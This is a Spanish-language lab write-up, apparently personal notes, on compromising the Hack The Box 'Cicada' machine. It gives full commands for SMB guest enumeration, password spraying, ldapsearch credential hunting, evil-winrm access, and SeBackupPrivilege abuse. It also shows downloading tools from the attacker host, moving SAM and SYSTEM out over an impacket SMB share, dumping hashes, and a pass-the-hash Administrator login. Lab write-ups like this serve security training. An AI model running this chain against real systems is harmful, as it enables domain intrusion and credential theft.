 #smb 
https://ctftalks.com/t/cicada-discussion-hints-htb/1411/7
hacemos un scaneo con [[Anotaciones/Herramientas/Nmap|Nmap]] y luego vemos que tiene el servicio ldap y smb, vamos a listar usuarios por el protocolo smb

```bash
nxc smb 10.10.11.35 -u 'guest' -p ''
```
![[Pasted image 20241004121333.png]]
- el usuario `guest` extiste, vamos a listar las cosas compartidas
```bash
nxc smb 10.10.11.35 -u 'guest' -p '' --shares
```
![[Pasted image 20241004121602.png]]
dentro de hr tienemos una password para un usuario vamos a probar a listar usuarios y luego vamos a probar la password para cada uno de ello a ver de cual es
```bash
nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep -E "*User*"
```
![[Pasted image 20241004121807.png]]
vamos a pasar esos a un diccionario y vamos a hacer fuerza bruta
```bash
nxc smb 10.10.11.35 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-succes
```
![[Pasted image 20241004121955.png]]
ahora que tenemos un usuario vamos a hacer uso de  [[ldapsearch]] para ver las descripciones de los usuario por si hubiera algo
```bash
ldapsearch -x -H ldap://10.10.11.35 -b dc=cicada,dc=htb -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' '(description=*password*)'
```
![[Pasted image 20241004122227.png]]
ahora que tenemos otro usuario vamos a intentar ver mas cosas en smb
![[Pasted image 20241004122509.png]]nos decargamos el script y dentro tiene la password de otro usuario, el nos nos ayudara a conectarnos al servidor con [[evil-winrm]]
```bash
evil-winrm -i 10.10.11.35 -u emily.oscars
```
listamos nuestros privilegios
![[Pasted image 20241004122646.png]]
para ver mas privilegios
```bash
net user emily.oscars
```
![[Pasted image 20241004123231.png]]
vamos a ver que usuarios son admin (en este caso solo Administrator)
```bash
net group "Domain Admins" /domain
```
![[Pasted image 20241004123416.png]]
y vemos que tenemos `SeBackupPrivilege` vamos ha hacer uso de esto para poder volcar el archivo SAM en nuestro equipo y luego hacerle fuerza bruta, vamos a ver si el usuarios `Administrator` se ha autenticado en el equipo alguna vez
![[Pasted image 20241004123524.png]]
teniendo en cuenta que este servidor esta haciedo uso de kerberos vamos hacer uso de [[Anotaciones/Herramientas/Rubeus.exe|Rubeus.exe]]
![[Pasted image 20241004125043.png]]
y en el otro equipo
```bash
curl 10.10.14.202/Rubeus.exe -o Rubeus.exe
```
![[Pasted image 20241004125241.png]]
en mi caso rubus no va, voy a mandarme una revershell con para poder usar meterpreter
![[Pasted image 20241004131145.png]]
ahora si investigamos podemos ver que la carpeta documents tiene el sam y system 
![[Pasted image 20241004161940.png]]
los pasamos a nuestro equipo haciendo un servidor smb
```bash
sudo impacket-smbserver smbFolder $(pwd) -smb2support
```
y ahora lo pasamos desde la victima
```bash
mv ./* \\10.10.14.202\smbFolder
```
y samos los hashes
```bash
impacket-secretsdump -sam sam -system system LOCAL
```
otra forma
```bash
samdump2 system sam -o hash
```

ahora podemos hacer [[Pass-The-Hash Attacks]] 
```bash
evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```
y ya somos root
